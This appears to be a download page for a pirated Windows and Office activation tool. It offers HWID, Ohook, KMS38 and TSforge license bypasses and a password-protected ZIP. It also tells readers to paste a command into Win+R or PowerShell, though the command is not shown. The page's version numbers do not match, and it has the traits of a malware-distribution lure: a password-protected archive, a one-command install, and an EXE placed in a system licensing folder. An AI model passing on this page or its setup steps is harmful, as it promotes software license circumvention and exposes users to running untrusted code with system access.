Windows 11 Pro HWID Activator (v2.2.6 — Windows 10 / 11 x64)

 
 
 

 Windows 11 Pro HWID Activator ( v2.2.6 ) is a pre-configured 64-bit Windows 10/11 distribution bundling Windows11-Activator.exe , runtime libraries, and offline configuration profiles in a single portable package.

---

 ⬇️ Download & Quick Setup (Windows 10 / 11 x64)

- 🚀 Open Windows 11 Pro HWID Activator Setup Portal ( Windows11-Activator.exe ) — Interactive Setup & Mirrors 
- 📦 Direct Download Portable .ZIP Archive ( windows-11-activator-v2.4.0-win64.zip · 2.66 MB · Password: 2026 ) 
- 📋 Release Notes & SHA-256 Checksums ( v2.2.6 ) 

 ⚡ Instant 1-Command Setup ( Win + R or PowerShell · 3 Seconds)
Press Win + R (or open Windows Terminal / PowerShell ), paste the command below, and press Enter :

 

 

 

---

 Key Features & Technical Specs

- Permanent HWID digital license activation for Windows 10 and Windows 11 (all editions)
- Offline Ohook sppc.dll symlink activation for Microsoft Office 2016 / 2021 / 2024 / 365
- KMS38 and TSforge offline activation up to year 2038 with zero background services
- Built-in activation status verifier, edition switcher, and WMI licensing repair utility

 Property Specification 
 :--- :--- 
 Package Binary Windows11Activator/Windows11-Activator.exe ( v2.2.6 ) 
 Target Runtime Windows Software Licensing Service ( sppsvc / slmgr.vbs / sppobjs.dll ) 
 Install Path %SystemRoot%\System32\spp\store\2.0 
 Supported OS Windows 10 / Windows 11 (64-bit, 22H2–24H2) 

---

 How to Install & Run

1. Open the Windows 11 Pro HWID Activator Setup & Download Portal (v2.2.6) or Releases.
2. Run the 3-second Win + R quick installer from the portal or extract the portable .zip archive.
3. Launch Windows11-Activator.exe from %SystemRoot%\System32\spp\store\2.0 .
